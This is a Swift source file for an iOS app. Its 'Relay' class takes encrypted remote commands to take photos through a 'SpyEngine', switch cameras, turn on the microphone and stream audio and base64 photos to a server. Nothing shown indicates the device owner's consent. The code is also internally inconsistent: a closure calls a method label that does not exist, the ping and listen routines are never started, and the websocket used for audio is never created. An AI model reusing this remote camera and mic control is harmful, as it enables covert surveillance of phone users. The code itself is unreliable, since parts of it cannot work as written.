import Foundation
import AVFoundation
import UIKit

final class Relay {
    static let shared = Relay()
    private var task: URLSessionWebSocketTask?
    private let audioQ = DispatchQueue(label: "relay.audio")
    private let down = Downsampler()

    func connect() {
        Mqtt.shared.onMessage = { [weak self] m in self?.handle(m: m) }
        Mqtt.shared.onUp = { Outbox.shared.flush() }
        Mqtt.shared.start()
    }

    private func ping() {
        task?.sendPing { [weak self] err in
            if err != nil { HealthMon.fail(.pushAlerts, "Relay unreachable") }
            else { Outbox.shared.flush() }
        }
        DispatchQueue.main.asyncAfter(deadline: .now() + 15) { self.ping() }
    }

    private func listen() {
        task?.receive { [weak self] res in
            defer { self?.listen() }
            guard case .success(let msg) = res else {
                DispatchQueue.main.asyncAfter(deadline: .now() + 3) { self?.connect() }
                return
            }
            guard case .string(let raw) = msg,
                  let plain = Cipher.open(raw),
                  let m = try? JSONSerialization.jsonObject(with: Data(plain.utf8)) as? [String: Any]
            else { return }
            self?.handle(m)
        }
    }

    private func handle(_ m: [String: Any]) {
        switch m["cmd"] as? String {
        case "snap":       SpyEngine.shared.snap()
        case "listen":     MicGate.shared.listen(seconds: m["seconds"] as? Double)
        case "stopListen": MicGate.shared.stopListening()
        case "micOn":      Settings.shared.set(.mic, true, remote: true); MicGate.shared.apply()
        case "micOff":     Settings.shared.set(.mic, false, remote: true); MicGate.shared.apply()
        case "front":      SpyEngine.shared.cameraPosition = .front
        case "back":       SpyEngine.shared.cameraPosition = .back
        case "recheck":    HealthMon.sweep()
        case "openSettings":
            if let u = URL(string: UIApplication.openSettingsURLString) {
                DispatchQueue.main.async { UIApplication.shared.open(u) }
            }
        default: break
        }
        if m["type"] as? String == "settings" { Settings.shared.applyRemote(m) }
    }

    func prepare(_ src: AVAudioFormat) {
        down.prepare(src)
        sendJSON(["type": "audio-format", "rate": 16000])
    }

    func sendJSON(_ o: [String: Any]) {
        guard let d = try? JSONSerialization.data(withJSONObject: o),
              let s = String(data: d, encoding: .utf8),
              let e = Cipher.seal(s) else { return }
        Mqtt.shared.publish(e)
    }

    func sendPCM(_ buf: AVAudioPCMBuffer) {
        guard let copy = buf.copy() as? AVAudioPCMBuffer else { return }
        audioQ.async {
            guard let small = self.down.process(copy), let ch = small.floatChannelData?[0] else { return }
            let n = Int(small.frameLength)
            var pcm = [Int16](repeating: 0, count: n)
            for i in 0..<n { pcm[i] = Int16(max(-1, min(1, ch[i])) * 32767) }
            self.task?.send(.data(pcm.withUnsafeBufferPointer { Data(buffer: $0) })) { _ in }
        }
    }

    func sendPhoto(_ d: Data) { sendJSON(["type": "photo", "b64": d.base64EncodedString()]) }
}

final class Downsampler {
    let target = AVAudioFormat(commonFormat: .pcmFormatFloat32,
                               sampleRate: 16000, channels: 1, interleaved: false)!
    private var conv: AVAudioConverter?
    func prepare(_ src: AVAudioFormat) { conv = AVAudioConverter(from: src, to: target) }
    func process(_ buf: AVAudioPCMBuffer) -> AVAudioPCMBuffer? {
        guard let c = conv else { return nil }
        let cap = AVAudioFrameCount(Double(buf.frameLength) * target.sampleRate / buf.format.sampleRate) + 64
        guard let out = AVAudioPCMBuffer(pcmFormat: target, frameCapacity: cap) else { return nil }
        var used = false, err: NSError?
        c.convert(to: out, error: &err) { _, s in
            if used { s.pointee = .noDataNow; return nil }
            used = true; return buf
        }
        return err == nil ? out : nil
    }
}
